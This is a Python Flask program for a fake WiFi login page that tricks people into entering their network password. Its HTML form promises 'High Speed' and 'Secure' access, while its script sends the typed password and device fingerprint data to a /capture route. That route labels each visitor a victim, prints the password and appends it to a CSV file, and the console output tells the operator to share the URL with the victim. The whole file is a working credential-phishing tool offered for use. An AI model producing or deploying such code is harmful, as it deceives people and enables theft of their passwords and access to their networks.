from flask import Flask, request, render_template_string, jsonify
import os
import sys
import time
import json
import csv
import subprocess
import socket
from datetime import datetime
from colorama import init as colorama_init, Fore, Style, Back

colorama_init(autoreset=True)

# Configuration
PORT = 5000
PASSWORDS_CSV = "wifi_passwords.csv"
HOST = "0.0.0.0"

app = Flask(__name__)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def display_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.BLUE}{Fore.GREEN}{' FAKE WIFI LOGIN PAGE '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.BLUE}{Fore.WHITE}{' by GitHub Project '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

# HTML for two girls version
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Authentication Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .girls-container {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .girl {
            text-align: center;
        }
        .girl-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            margin: 0 auto 10px;
        }
        .girl-name {
            font-weight: bold;
            color: #667eea;
        }
        .girl-message {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }
        .title {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 20px;
        }
        .wifi-icon {
            font-size: 50px;
            margin: 15px 0;
            color: #667eea;
        }
        .form-group {
            margin: 15px 0;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: border 0.3s;
        }
        input[type="password"]:focus {
            border-color: #667eea;
            outline: none;
        }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 10px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .feature {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 10px;
            font-size: 12px;
            color: #666;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
        }
        .success { 
            background: #d4edda; 
            color: #155724;
            display: block; 
        }
        .error { 
            background: #f8d7da; 
            color: #721c24;
            display: block; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">📶</div>
        <div class="title">WiFi Authentication Required</div>
        <div class="subtitle">Enter WiFi password to continue browsing</div>
        
        <div class="girls-container">
            <div class="girl">
                <div class="girl-avatar">👩</div>
                <div class="girl-name">Sophia</div>
                <div class="girl-message">"Connect to browse freely!"</div>
            </div>
            <div class="girl">
                <div class="girl-avatar">👧</div>
                <div class="girl-name">Emma</div>
                <div class="girl-message">"Fast WiFi available!"</div>
            </div>
        </div>

        <div class="features">
            <div class="feature">⚡ High Speed</div>
            <div class="feature">🔒 Secure</div>
            <div class="feature">🌐 Unlimited</div>
            <div class="feature">📱 All Devices</div>
        </div>

        <form id="wifiForm">
            <div class="form-group">
                <label for="wifiPassword">WiFi Password:</label>
                <input type="password" id="wifiPassword" name="password" 
                       placeholder="Enter your WiFi password" required>
            </div>
            
            <button type="submit" class="btn" id="connectBtn">
                🔗 CONNECT TO WiFi
            </button>
        </form>

        <div id="status" class="status"></div>
        
        <div style="font-size: 12px; color: #999; margin-top: 20px;">
            🔒 Your connection is secured | 📞 Support: 24/7 Available
        </div>
    </div>

    <script>
        document.getElementById('wifiForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('status');
            const password = document.getElementById('wifiPassword').value;
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Connecting...';
            
            // Collect device info
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            
            // Send data to server
            fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    password: password,
                    deviceInfo: deviceInfo
                })
            })
            .then(response => response.json())
            .then(data => {
                status.className = 'status success';
                status.innerHTML = '✅ Connected successfully! You can now browse the internet.';
                btn.style.display = 'none';
            })
            .catch(error => {
                status.className = 'status error';
                status.innerHTML = '❌ Connection failed. Please try again.';
                btn.disabled = false;
                btn.innerHTML = '🔗 CONNECT TO WiFi';
            });
        });
    </script>
</body>
</html>
'''

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\n{Fore.GREEN}{'🎯 NEW VICTIM ACCESSED ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    return render_template_string(HTML_PAGE)

@app.route("/capture", methods=["POST"])
def capture_password():
    try:
        data = request.get_json()
        password = data.get("password")
        device_info = data.get("deviceInfo", {})
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        print(f"\n{Fore.GREEN}{'🔑 PASSWORD CAPTURED ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}🔑 WiFi Password: {password}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 IP Address: {client_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌍 Browser: {device_info.get('userAgent', 'Unknown')[:80]}...{Style.RESET_ALL}")
        
        # Save to CSV
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': client_ip,
            'password': password,
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        file_exists = os.path.isfile(PASSWORDS_CSV)
        with open(PASSWORDS_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        print(f"{Fore.GREEN}✅ Password saved to: {PASSWORDS_CSV}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'🎯 CAPTURE COMPLETED ':=^60}{Style.RESET_ALL}")
        
        return jsonify({"status": "success", "message": "Connected successfully"})
        
    except Exception as e:
        print(f"{Fore.RED}{'❌ CAPTURE ERROR ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": "Connection failed"}), 500

def main():
    display_banner()
    
    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 FAKE WIFI SERVER STARTED ':=^60}{Style.RESET_ALL}")
    
    # Get local URLs
    local_ip = get_local_ip()
    local_url = f"http://localhost:{PORT}"
    network_url = f"http://{local_ip}:{PORT}"
    
    print(f"{Fore.CYAN}🌐 Local URL: {local_url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Network URL: {network_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📢 Share the network URL with victim{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim to enter WiFi password...{Style.RESET_ALL}")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
